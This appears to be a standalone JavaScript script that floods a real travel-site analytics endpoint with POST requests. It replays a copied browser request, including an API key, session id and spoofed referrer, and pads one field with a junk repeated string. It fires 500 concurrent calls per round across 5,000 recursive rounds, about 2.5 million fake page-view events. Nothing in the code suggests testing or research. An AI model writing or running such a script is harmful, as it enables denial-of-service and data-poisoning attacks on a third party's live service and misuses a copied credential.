

async function call(){
	return fetch("https://api-prod.getfeasy.com/travelto/be/tracking-services/api/v1/user-event", {
		"headers": {
		  "accept": "application/json, text/plain, */*",
		  "accept-language": "en-US,en;q=0.9",
		  "cache-control": "no-cache",
		  "content-type": "application/json",
		  "pragma": "no-cache",
		  "priority": "u=1, i",
		  "sec-ch-ua": "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"",
		  "sec-ch-ua-mobile": "?0",
		  "sec-ch-ua-platform": "\"macOS\"",
		  "sec-fetch-dest": "empty",
		  "sec-fetch-mode": "cors",
		  "sec-fetch-site": "cross-site",
		  "x-api-key": "wCnVrnsZyHwNPqt60oXM",
		  "x-session-id": "rkqv9gietiuymid3pfbeg"
		},
		"referrer": "https://destinations.cheapoair.com/",
		"referrerPolicy": "strict-origin-when-cross-origin",
		"body": "{\"deviceUuid\":\"c705e5fd-945a-4840-9d2a-90d625ab5a17\",\"startTimestamp\":1730124354632,\"url\":\"https://destinations.cheapoair.com/landing/main\",\"pageType\":\"landingPage\",\"_data\":{},\"deviceInfo\":{\"userAgent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\",\"os\":\"Mac\",\"browser\":\"Chrome\",\"device\":\"Macintosh\",\"os_version\":\"mac-os-x-15\",\"browser_version\":\"130.0.0.0\",\"deviceType\":\"desktop\",\"orientation\":\"landscape\",\"innerWidth\":2540,\"innerHeight\":913},\"environment\":\"\",\"appVersion\":\"1.0.0\",\"cookieId\":\"ccd610d7-310f-461c-abd7-17583948c9eb\",\"clientCookieId\":null,\"latitude\":null,\"longitude\":null,\"adsInfo\":null,\"client\":\"COUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUCCOUCOUCOUCOUCOUC\",\"language\":\"en-US\",\"cookiesAccepted\":true,\"utm\":{\"campaign\":null,\"source\":\"\",\"medium\":null,\"content\":null,\"term\":null},\"timestamp\":1730124365476,\"timeSpent\":10844,\"eventType\":\"ev_pageView\"}",
		"method": "POST",
		"mode": "cors",
		"credentials": "omit"
	  });
}


let total_call = 0

async function main(nb_recur)
{
	try {
		let promises = [];
		for (let i=0 ; i< 500 ; ++i)
		{
			promises.push(call());
		}

		console.log(`[${nb_recur}]`, "All calls are made", promises.length);

		for (let prom of promises)
		{
			let rep = null
			try {
				rep = await prom;
			}
			catch(e)
			{
				console.log(`[${nb_recur}]`,"Error", e);
			}
			total_call++;
			if (total_call %1000 == 0) {
				console.log(`[${nb_recur}]`,total_call, "Calls done. Reply :", rep? rep.status: 'fail');
			}
		}
	}
	catch(e)
	{
		console.log(`[${nb_recur}]`,"Occurence failed", e)
	}

	if (nb_recur > 0)
	{
		main(nb_recur-1)
	}	
}

main(5000);